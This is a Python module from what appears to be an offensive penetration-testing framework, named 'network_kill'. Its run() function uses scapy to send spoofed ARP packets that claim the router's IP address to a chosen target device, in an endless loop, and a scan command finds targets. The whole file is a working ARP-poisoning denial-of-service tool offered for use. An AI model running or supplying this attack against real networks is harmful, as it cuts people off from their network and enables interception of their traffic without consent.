#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

from optparse import OptionParser
import os
import signal
from time import sleep
import logging
from scapy.all import *
from collections import OrderedDict
from core import colors
from core import network_scanner

# Info about the module
#modules name
name = "network_kill"
#version
version = "1.0"
# Description
desc = "kicks out target device from network with arp calls"
#created by
createdby = "4shadoww"
# Creator's github
github = "4shadoww"
# Email
email = "4shadoww0@gmail.com"

needroot = 1

#list
variables = OrderedDict((
('target', '192.168.1.2'),
('router', '192.168.1.1'),
))

# Description for variables
vdesc = [
"target device's ip",
"router's ip",
]

# Help for the custom commands (remove if you will not use custom commands)
mhelp = OrderedDict((
('scan', 'scan for targets'),
))

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!\n this will not work alway because some devices can refuse from arp request!"+colors.end

#custom commands
customcommands = (
'scan'
)

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(colors.blue + "[*] arp poisoning has been started!" + colors.end)
	print(colors.blue + "[*] ctrl + c to end" + colors.end)
	packet = ARP()
	packet.psrc = variables['router']
	packet.pdst = variables['target']
	while 1:
		send(packet, verbose=False)
		sleep(10)

def scan():
	network_scanner.scan()